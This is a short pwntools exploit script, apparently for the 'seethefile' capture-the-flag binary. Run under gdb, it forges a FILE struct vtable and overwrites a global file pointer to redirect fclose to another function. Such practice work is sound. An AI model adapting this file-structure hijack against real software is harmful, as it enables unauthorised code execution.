from pwn import *

seethefile = ELF('seethefile')
libc = ELF('libc_32.so.6')


VTABLE_OFFSET = 0x90
VTABLE_FCLOSE_OFFSET = 0x44

MAGICBUF_ADDR = 0x0804B0C0
FP_ADDR = 0x0804B280
WELCOME_ADDR = 0x08048955


p = gdb.debug(
    seethefile.path,
    '''
    b fclose
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


# Fill `magicbuf` with 'A'
p.sendline('1')
p.sendline('/proc/self/fd/0')
p.sendline('2')

payload = b''

# Override `fclose` handler.
payload += b'A' * VTABLE_FCLOSE_OFFSET + p32(WELCOME_ADDR)

# Override `vtable` member of the `FILE` struct.
payload += b'A' * (VTABLE_OFFSET - VTABLE_FCLOSE_OFFSET) + p32(MAGICBUF_ADDR)

# Fill buffer
payload += b'A' * 500

p.sendline(payload)

p.sendline('5')
# Set `fp` to `magicbuf`
p.sendline(b'A' * 0x20 + p32(MAGICBUF_ADDR))
